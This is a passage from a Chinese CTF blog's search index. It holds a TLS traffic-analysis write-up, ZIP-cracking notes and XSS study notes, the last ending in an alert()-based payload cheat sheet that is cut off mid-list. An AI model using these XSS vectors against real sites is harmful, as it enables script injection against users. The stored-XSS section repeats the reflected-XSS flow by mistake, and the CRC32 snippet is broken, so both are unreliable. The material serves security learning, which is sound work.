<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>记一道TLS加密流量分析</title>
      <link href="/2025/09/14/%E8%AE%B0%E4%B8%80%E9%81%93TLS%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2025/09/14/%E8%AE%B0%E4%B8%80%E9%81%93TLS%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="记一道TLS加密流量分析"><a href="#记一道TLS加密流量分析" class="headerlink" title="记一道TLS加密流量分析"></a>记一道TLS加密流量分析</h1><p>2025磐石行动的一道题</p><p>总结：TLS流量主要的难点是找到密钥，密钥找到后导入就变成正常的流量分析了</p><hr><p><strong>题目：derderjia</strong></p><p>第9个流，尝试进行了sql注入，服务器返回报错，暴露了服务器的一些环境信息：</p><p><img src="https://pic1.imgdb.cn/item/68c96118c5157e1a880dfe96.png" alt=""></p><p>11流：执行了whoami命令：</p><p><img src="https://pic1.imgdb.cn/item/68c96129c5157e1a880dff0b.png" alt=""></p><p>12流：进一步执行了id命令：</p><p><img src="https://pic1.imgdb.cn/item/68c96139c5157e1a880dff93.png" alt=""></p><p>表明Web服务以www-data用户运行（典型的Apache/Nginx默认用户），且权限受限。</p><p>13流：</p><p><img src="https://pic1.imgdb.cn/item/68c9614ac5157e1a880e000a.png" alt=""></p><p>攻击者执行了uname -a 命令，获取了系统内核版本、主机名、CPU架构等敏感信息。</p><p>第14流</p><p>发现ls命令，可以看到服务器上有四个文件：</p><p><img src="https://pic1.imgdb.cn/item/68c9615cc5157e1a880e0094.png" alt=""></p><p>第16流：</p><p>这里将一个字符串，看上去很像flag的东西写到/tmp/proof.txt里：</p><p><img src="https://pic1.imgdb.cn/item/68c9616cc5157e1a880e010e.png" alt=""></p><p>19流：cat到了server_key的内容:</p><p><img src="https://pic1.imgdb.cn/item/68c9617ac5157e1a880e0169.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET <span class="number">8736827</span>acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 <span class="number">9</span>f78e4604953f8aab6623774bd88a9720fde4d6303619847242c0cd00c64ff2644b83823dee3e08577552389d5af52de</span><br><span class="line">EXPORTER_SECRET <span class="number">8736827</span>acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 <span class="number">54</span>b708ed18540ab2b7b7b54d49692a07ccc9dd7ec34a1e3df4ecdc3c53146f799d794ab805cf9b21c08d464aeff64f42</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 <span class="number">8736827</span>acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 <span class="number">486</span>c14091928a932ff17e9cd52111548837f0b6cbe372264086f45d668862e4c0ea792cbbd9bfba1468834f5eebd5f69</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET <span class="number">8736827</span>acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 c89356f603c98d9257b9391dde781e115f6133d4d9c9be704d77843f7cb9ec82488c46195660b5059ca742bd1da01c17</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 <span class="number">8736827</span>acbd4e800d94e5bc87cdbab64f0d77fc6724acda32a7ee24f7c60db50 <span class="number">6</span>f3912fd7864676affa95e344a8fcbd1d2f452c0b00b7969bffff93a9149313a2d07438164dbc3d36de6888b3bee4e9c</span><br><span class="line">SERVER_HANDSHAKE_TRAFFIC_SECRET ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf afa6b2942173a3137105ad1a7318413c4555f39be24d98363eb934d9d4673b0c4846efad533da90549db01826c26963e</span><br><span class="line">EXPORTER_SECRET ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf <span class="number">9334222</span>dde7ed136e73d4ded2af66fab4cd2ed099a438e60ad221d1e0e95e3e694b98b2e45a7444d4f2d38213e64981e</span><br><span class="line">SERVER_TRAFFIC_SECRET_0 ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf <span class="number">213</span>d59d6262f24428d0daf8ee557d7cc0a776aaffc5e706c3a5871d61f83e90d1932586c463a1452fc4d0a491e500d55</span><br><span class="line">CLIENT_HANDSHAKE_TRAFFIC_SECRET ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf bfc79bee6244302f1a0091e6cd289131ede8f17a0d42f09b32970a1091002db1cf1b10cf0b1e1097490daacbc8c53aef</span><br><span class="line">CLIENT_TRAFFIC_SECRET_0 ce5146a2783f8a34f0acbc25e2d2203d65ae09be6cc1ebbc5c5aa782149d3fbf d93ae56aa54258dc541f74ae06b137bdffb00b18f0b3bffadf0a7999b6f71fde5257e1209d08a9765bccf5f7c25c6a76</span><br></pre></td></tr></table></figure><p>那么目标应该是通过密钥解密TLS加密流量：</p><p><img src="https://pic1.imgdb.cn/item/68c96188c5157e1a880e0189.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/68c96199c5157e1a880e0195.png" alt=""></p><p>解密后观察TLS流量，</p><p>多出来一个虚假flag：</p><p><img src="https://pic1.imgdb.cn/item/68c961aec5157e1a880e01a2.png" alt=""></p><p>以及第17流：</p><p><img src="https://pic1.imgdb.cn/item/68c961bbc5157e1a880e01a7.png" alt=""></p><p>这是/upload,也就是攻击者上传的文件！这里的PK很明显是zip的文件头，我们将其导出：</p><p><img src="https://pic1.imgdb.cn/item/68c961c9c5157e1a880e01ac.png" alt=""></p><p>可以看到压缩包里面是一张图片，但是被加密了：</p><p><img src="https://pic1.imgdb.cn/item/68c961d8c5157e1a880e01ae.png" alt=""></p><p>压缩包文件尾后面有一串信息：</p><p><img src="https://pic1.imgdb.cn/item/68c961e7c5157e1a880e01b5.png" alt=""></p><p>uwpn2quR2tAJASs9yIcWOV，但是并不是密码，没有用</p><p>之后，流量包中，发现了两个dns协议流量，分别有一半的base64加密数据：</p><p><img src="https://pic1.imgdb.cn/item/68c961f4c5157e1a880e01bd.png" alt=""></p><p>进行解密得到：</p><p>Good! You Find it PanShi2025!</p><p>尝试之后，发现“PanShi2025!”就是压缩包密码！</p><p>解压得到图片：</p><p><img src="https://pic1.imgdb.cn/item/68c96203c5157e1a880e01d4.png" alt=""></p><p>放到随波逐流，发现宽高修改，一把梭得到flag：</p><p><img src="https://pic1.imgdb.cn/item/68c96210c5157e1a880e01dd.png" alt=""></p><p><img src="https://pic1.imgdb.cn/item/68c96220c5157e1a880e01e0.png" alt=""></p><p><strong>flag{W0w_Y0u_F0und_M3!}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于hexo框架的博客搭建及魔改美化教程</title>
      <link href="/2025/05/20/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/"/>
      <url>/2025/05/20/%E5%9F%BA%E4%BA%8Ehexo%E6%A1%86%E6%9E%B6%E7%9A%84%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8F%8A%E9%AD%94%E6%94%B9%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="基于hexo框架的博客搭建及魔改美化教程"><a href="#基于hexo框架的博客搭建及魔改美化教程" class="headerlink" title="基于hexo框架的博客搭建及魔改美化教程"></a>基于hexo框架的博客搭建及魔改美化教程</h1><blockquote><p><strong>Introduction:</strong>本篇旨在提供一份完整的博客搭建教程，基于github的pages部署功能以及hexo博客框架</p></blockquote><p>特别感谢：<a href="https://www.fomal.cc/"><strong>Fomalhaut🥝</strong></a> 本人的技术博客多次参考其部署和美化教程</p><p>参考文章来自：<a href="https://www.fomal.cc/"><strong>Fomalhaut🥝</strong></a> | 鼓励支持原创</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-zip文件分析</title>
      <link href="/2025/05/11/misc-%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
      <url>/2025/05/11/misc-%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc-zip文件分析"><a href="#Misc-zip文件分析" class="headerlink" title="Misc-zip文件分析"></a>Misc-zip文件分析</h1><blockquote><p>参考文档：<a href="https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458483850&amp;idx=1&amp;sn=b2a624f6753f81072ce9b78419dbc865&amp;chksm=b18e4c0086f9c516e126950fb9fb5d2bcdbd31b147374c693b37dcbb1fff6e5dfaaca4396605&amp;scene=27">https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458483850&amp;idx=1&amp;sn=b2a624f6753f81072ce9b78419dbc865&amp;chksm=b18e4c0086f9c516e126950fb9fb5d2bcdbd31b147374c693b37dcbb1fff6e5dfaaca4396605&amp;scene=27</a></p></blockquote><h2 id="案例分析："><a href="#案例分析：" class="headerlink" title="案例分析："></a>案例分析：</h2><p><img src="https://pic1.imgdb.cn/item/68230e0c58cb8da5c8f082d9.jpg" alt=""></p><p>如你所见，这，是一张图片，我们想把它发送给某位朋友，但是却不想让其他的人看到。</p><p>于是，我们选择将其压缩为加密压缩包：</p><p><img src="https://pic1.imgdb.cn/item/68230e2858cb8da5c8f082db.png" alt=""></p><p>如此一来，只有你和你的朋友（知道密码的人）可以打开压缩包，而没有密码的，则无法解压，也就看不到图片。</p><p><img src="https://pic1.imgdb.cn/item/68230e3c58cb8da5c8f082df.png" alt=""></p><p>你可能会想，这样就足够保密了，但是，事实真正如此吗？？？</p><p>对此，正在学习misc的黑客小明表示不屑，声称不到30秒就可以破解这个加密的压缩包！</p><p>当然，是不知道密码的前提下！</p><p>那么，其中究竟蕴含着什么技术原理和知识呢？</p><p>这便是CTF-MISC中的常见题目类型——压缩包分析破解</p><p>ZIP压缩包是CTF-MISC方向中最常见的题型之一，涉及文件结构分析、密码破解、数据修复等多个技术点。</p><hr><h2 id="一、ZIP文件结构"><a href="#一、ZIP文件结构" class="headerlink" title="一、ZIP文件结构"></a>一、ZIP文件结构</h2><p>一个zip文件由三部分组成：压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</p><p><img src="https://pic1.imgdb.cn/item/68230eef58cb8da5c8f082f0.png" alt=""></p><h3 id="压缩源文件数据区"><a href="#压缩源文件数据区" class="headerlink" title="压缩源文件数据区"></a><strong>压缩源文件数据区</strong></h3><p>在这个数据区中每一个压缩的源文件/目录都是一条记录，记录的格式如下：<br>[文件头+ 文件数据 + 数据描述符]</p><p><img src="https://pic1.imgdb.cn/item/68230cd558cb8da5c8f07c24.png" alt=""></p><p>这个数据描述符只在全局方式位标记的第３位设为１时才存在，紧接在压缩数据的最后一个字节后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。</p><p>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密） 头文件标记后2bytes<br>08 00：压缩方式</p><h3 id="压缩源文件目录区"><a href="#压缩源文件目录区" class="headerlink" title="压缩源文件目录区"></a><strong>压缩源文件目录区</strong></h3><p>在这个数据区中每一条纪录对应在压缩源文件数据区中的一条数据。</p><p><img src="https://pic1.imgdb.cn/item/68230d7558cb8da5c8f08146.png" alt=""></p><p>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，伪加密的关键） 目录文件标记后4bytes<br>08 00：压缩方式</p><h3 id="压缩源文件目录结束标志"><a href="#压缩源文件目录结束标志" class="headerlink" title="压缩源文件目录结束标志"></a><strong>压缩源文件目录结束标志</strong></h3><p><img src="https://pic1.imgdb.cn/item/68230dbd58cb8da5c8f082c2.png" alt=""></p><p>50 4B 05 06：目录结束标记</p><p>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号</p><hr><h2 id="二、常见题型"><a href="#二、常见题型" class="headerlink" title="二、常见题型"></a>二、常见题型</h2><h3 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h3><p><strong>原理</strong>：通过修改加密标志位误导解压软件</p><ul><li><strong>检测方法</strong>： <ul><li>放入随波逐流进行检测</li><li>查看<code>hex</code>编辑器中<code>General Purpose Bit Flag</code>字段<ul><li>伪加密：第0位为1（0x0001）</li><li>真加密：第6位为1（0x0041）</li></ul></li></ul></li></ul><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><ul><li><strong>适用场景</strong>：弱密码或已知字符集</li><li><strong>工具推荐</strong>：<ul><li><code>ARCHPR</code>（图形化界面）</li></ul></li></ul><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><ul><li><strong>前提条件</strong>：<ul><li>已知压缩包内至少一个文件的完整内容</li><li>使用相同加密算法和相同密码</li></ul></li><li><strong>操作步骤</strong>：<ol><li>用已知文件生成无加密的参考ZIP</li><li>使用<code>ARCHPR</code>进行爆破</li></ol></li></ul><h3 id="CRC32碰撞"><a href="#CRC32碰撞" class="headerlink" title="CRC32碰撞"></a>CRC32碰撞</h3><ul><li><strong>适用场景</strong>：小文件（&lt;6KB）无加密</li><li><strong>实现原理</strong>：通过CRC校验值逆向文件内容</li><li><strong>工具推荐</strong>：<ul><li><code>python</code>的<code>zlib</code>库</li><li><code>crc32killer</code>（自动化脚本）</li></ul></li><li><p><strong>示例代码</strong>：</p></li><li><pre><code class="lang-python">import zlibtarget_crc = 0x12345678  # 替换为实际CRC值for i in range(0xFFFFFFFF):    if zlib.crc32(bytes([i])) == target_crc:        print(bytes([i]))        break</code></pre></li></ul><hr><h2 id="三、进阶技巧与特殊题型"><a href="#三、进阶技巧与特殊题型" class="headerlink" title="三、进阶技巧与特殊题型"></a>三、进阶技巧与特殊题型</h2><h3 id="嵌套压缩包"><a href="#嵌套压缩包" class="headerlink" title="嵌套压缩包"></a>嵌套压缩包</h3><ul><li><strong>常见形式</strong>：<ul><li>ZIP套娃（多层嵌套）</li><li>混合文件类型（ZIP内嵌RAR/7z）</li></ul></li><li><strong>解决方法</strong>：<ul><li>编写脚本自动化提取</li><li>使用<code>binwalk</code>检测隐藏文件</li></ul></li></ul><h3 id="文件修复"><a href="#文件修复" class="headerlink" title="文件修复"></a>文件修复</h3><ul><li><strong>常见问题</strong>：<ul><li>文件头损坏（修复签名<code>50 4B 03 04</code>）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS简记</title>
      <link href="/2025/04/22/XSS%E7%AE%80%E8%AE%B0/"/>
      <url>/2025/04/22/XSS%E7%AE%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS从0到1"><a href="#XSS从0到1" class="headerlink" title="XSS从0到1"></a>XSS从0到1</h1><blockquote><p>本篇记学习XSS的历程.    ——M.Y</p><p>参考文章：</p><blockquote><p><a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">https://blog.csdn.net/LYJ20010728/article/details/116462782</a></p></blockquote></blockquote><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>xss，全称<strong>跨站脚本攻击(Cross Site Scripting)</strong>，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。</p><p>这是一种将任意 Javascript 代码插入到其他Web用户页面中执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览该页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。</p><p>凡是数据输入或者交互的地方，都有可能发生xss。</p><p>XSS属于代码注入的一种，它允许攻击者将代码注入到网页，其他用户在浏览网页时就会受到影响。</p><p>XSS属于客户端攻击，受害者最终是用户，但是，网站的管理人员也是用户之一。这意味着XSS可以进行“服务端攻击”</p><p><strong>漏洞出现的原因：</strong></p><p>程序对输入和输出不够严格，导致“精心构造”的脚本输入后，在输出前端时被浏览器当作有效代码解析执行从而产生危害。</p><h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><p><strong>反射型：</strong>反射型XSS是最基本的XSS形式，也被称为非持久型XSS(Non-persistent XSS)。这种攻击的特点是恶意脚本不会永久存储在目标服务器上，而是通过URL参数、表单提交等途径”反射”回用户的浏览器中执行。</p><ol><li>攻击者构造包含恶意脚本的特殊URL</li><li>通过钓鱼邮件、社交工程等方式诱使受害者点击该URL</li><li>服务器接收请求并将恶意脚本”反射”到响应页面中</li><li>受害者的浏览器解析并执行该脚本</li></ol><p>在CTF中，反射型XSS题目通常表现为：</p><ul><li>搜索框、联系表单等输入点直接将用户输入返回到页面</li><li>URL参数值未经处理直接输出到HTML中</li><li>需要构造特殊URL并诱导管理员或bot访问以获取flag</li></ul><p>例：<code>http://www.test.com/search.php?key=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p><hr><p><strong>存储型：</strong>存储型XSS，又称持久型XSS(Persistent XSS)，是更为危险的XSS形式。与反射型不同，存储型XSS的恶意脚本会被永久保存在目标服务器上(如数据库、留言板、评论区域等)，每当用户访问包含该恶意内容的页面时，脚本就会被执行</p><p><strong>典型攻击流程</strong>：</p><ol><li>攻击者构造包含恶意脚本的特殊URL</li><li>通过钓鱼邮件、社交工程等方式诱使受害者点击该URL</li><li>服务器接收请求并将恶意脚本”反射”到响应页面中</li><li>受害者的浏览器解析并执行该脚本</li></ol><p>在CTF中，反射型XSS题目通常表现为：</p><ul><li>搜索框、联系表单等输入点直接将用户输入返回到页面</li><li>URL参数值未经处理直接输出到HTML中</li><li>需要构造特殊URL并诱导管理员或bot访问以获取flag</li></ul><hr><p><strong>DOM型：</strong>DOM型XSS是一种特殊的XSS形式，其特点是恶意代码完全在客户端执行，不涉及服务器端的响应处理。这种漏洞源于JavaScript对DOM(文档对象模型)的不安全操作，如使用<code>document.write</code>、<code>innerHTML</code>或<code>eval</code>等函数直接处理用户可控的数据。</p><p><strong>典型攻击流程</strong>：</p><ol><li>攻击者构造包含恶意脚本的特殊URL</li><li>受害者访问该URL</li><li>客户端JavaScript从URL或页面元素中提取数据并动态修改DOM</li><li>修改过程中未正确过滤导致恶意脚本执行</li></ol><p>在CTF中，DOM型XSS题目通常表现为：</p><ul><li>页面使用JavaScript从URL参数或片段(fragment)中读取数据并动态更新页面内容</li><li>使用<code>eval</code>、<code>setTimeout</code>或<code>Function</code>构造函数等动态执行代码</li><li>需要分析前端JavaScript逻辑才能构造有效payload</li></ul><p>例如以下前端代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> target = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;Welcome &quot;</span> + target);</span><br></pre></td></tr></table></figure><p>攻击者可构造如下url：</p><p><code>http://vulnerable-site.com/#&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></p><h2 id="触发标签"><a href="#触发标签" class="headerlink" title="触发标签"></a>触发标签</h2><h3 id="无过滤："><a href="#无过滤：" class="headerlink" title="无过滤："></a>无过滤：</h3><p>在程序没有进行过滤的情况下，有以下触发标签：</p><ol><li><code>&lt;script&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;img&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 图片加载错误时触发</span></span><br><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;alert(&#x27;xss&#x27;)&quot;)&gt;</span><br><span class="line">// 鼠标指针移动到元素时触发</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(1)&quot;&gt;</span><br><span class="line">// 鼠标指针移出时触发</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;a&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;https://www.qq.com&quot;</span>&gt;qq&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:a&quot;</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">kycg.asp?ttt</span>=<span class="string">1000</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">y</span>=<span class="string">2016</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ol><li><code>&lt;input&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span><br><span class="line"><span class="comment">// 竞争焦点，从而触发onblur事件</span></span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">// 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;</span><br><span class="line">&lt;input value=&quot;&quot; onclick=alert(&#x27;xss&#x27;) type=&quot;text&quot;&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot; onmouseover=prompt(&#x27;xss&#x27;) bad=&quot;&quot;&gt;</span><br><span class="line">&lt;input name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">// 按下按键时触发</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(1)&quot;&gt;</span><br><span class="line">// 按下按键时触发</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(1)&quot;&gt;</span><br><span class="line">// 松开按键式时触发</span><br><span class="line">&lt;input type=&quot;text&quot; onkeyup=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;form&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>) method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">&lt;form action=javascript:alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=prompt(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;form method=post action=aa.asp? onmouseover=alert(&#x27;xss&#x27;)&gt;</span><br><span class="line">&lt;form action=1 onmouseover=alert(&#x27;xss)&gt;</span><br><span class="line">&lt;form method=post action=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;form method=post action=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;iframe&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);&gt;&lt;/iframe&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(&#x27;xss&#x27;)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;aaa&quot; onmouseover=alert(&#x27;xss&#x27;) /&gt;&lt;iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript&amp;colon;prompt&amp;lpar;``xss``&amp;rpar;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">//(````只有两个``)</span><br></pre></td></tr></table></figure><ol><li><code>&lt;svg&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><ol><li><code>&lt;body&gt;</code></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br><span class="line"><span class="comment">// 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</span></span><br><span class="line">&lt;body 